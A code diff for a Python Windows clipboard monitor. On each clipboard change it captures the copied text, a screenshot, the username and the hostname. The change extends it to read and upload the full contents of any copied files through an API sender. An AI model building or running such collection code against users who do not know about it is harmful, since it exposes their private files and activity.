@@ -15,10 +15,10 @@ import apiSender
 import time
 import json
 import base64
+import mimetypes
 
 previous_content = None
 
-# To Listen to a Windows Signal we need to have some kind of window that can hook into it. Somehow :D. I read this kind of things on a Blog and some Stackoverflow discussions. Have to dig deeper into it.
 def create_window():
     wc = win32gui.WNDCLASS()
     wc.lpfnWndProc = wnd_proc
@@ -36,37 +36,84 @@ def wnd_proc(hwnd, msg, wparam, lparam):
 
 def process_clipboard():
     global previous_content
-    current_content = get_clipboard_content()
-    if current_content and current_content != previous_content:
-        print("Detected new clipboard content, logging.")
-        print(current_content)
-        imageBase64String = do_screenshot()
-        username = read_username()
-        hostname = read_hostname()
+    win32clipboard.OpenClipboard()
+    if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
+        current_content = get_text_clipboard_content()
+        if current_content and current_content != previous_content:
+            print("Detected new clipboard content, logging.")
+            print(current_content)
+            imageBase64String = do_screenshot()
+            username = read_username()
+            hostname = read_hostname()
 
-        data = {
-        "username": username,
-        "hostname": hostname,
-        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
-        "content": current_content,
-        }
-        print(imageBase64String)
-        utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
-        apiSender.send(imageBase64String, data)
-        previous_content = current_content
+            data = {
+                "username": username,
+                "hostname": hostname,
+                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
+                "content": current_content,
+                "action_type": "text"
+            }
+            print(imageBase64String)
+            utility.log_clipboard_content(current_content, username + " " + hostname, main.log_file)
+            apiSender.send_text_data(imageBase64String, data)
+            previous_content = current_content
+    elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
+        current_content = get_file_clipboard_content()
+        if current_content and current_content != previous_content:
+            print("Detected new clipboard content, logging.")
+            username = read_username()
+            hostname = read_hostname()
+            files = []
+            for file_path in current_content:
+                file_data, mime_type = read_file(file_path)
+                file_name = os.path.basename(file_path)
+                files.append(('files', (file_name, file_data, mime_type)))
+            data = {
+                "username": username,
+                "hostname": hostname,
+                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
+                "content": "",
+                "action_type": "files"
+            }
+            #print(data)
+            #print(files)
+            apiSender.send_file_data(files, data)
+            previous_content = current_content
 
-def get_clipboard_content():
+def get_text_clipboard_content():
     content = None
     try:
         win32clipboard.OpenClipboard()
-        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
-            data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
-            content = data if isinstance(data, str) else None
+        data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
+        content = data if isinstance(data, str) else None
     except Exception as e:
         print(f"Error accessing clipboard: {e}")
     finally:
         win32clipboard.CloseClipboard()
     return content
+
+def get_file_clipboard_content():
+    content = None
+    try:
+        data = win32clipboard.GetClipboardData(win32con.CF_HDROP)
+        if data:
+            content = list(data)
+    except Exception as e:
+        print(f"Error accessing clipboard: {e}")
+    finally:
+        win32clipboard.CloseClipboard()
+    return content
+
+def read_file(file_path):
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        mime_type, _ = mimetypes.guess_type(file_path)
+        
+        return file_data, mime_type
+    except Exception as e:
+        print(f"Error reading file {file_path}: {e}")
+        return None, None
 
 def do_screenshot():
     screenshot = pyautogui.screenshot()
@@ -85,7 +132,6 @@ def byteArray(screenshot):
     resized_screenshot = screenshot.resize((new_width, new_height))
     resized_screenshot.save('resized_screenshot.png')
     img_byte_arr = io.BytesIO()
-    # changed to resized one
     resized_screenshot.save(img_byte_arr, format='PNG')
     img_byte_arr = img_byte_arr.getvalue()
     base64_string = base64.b64encode(img_byte_arr).decode('utf-8')
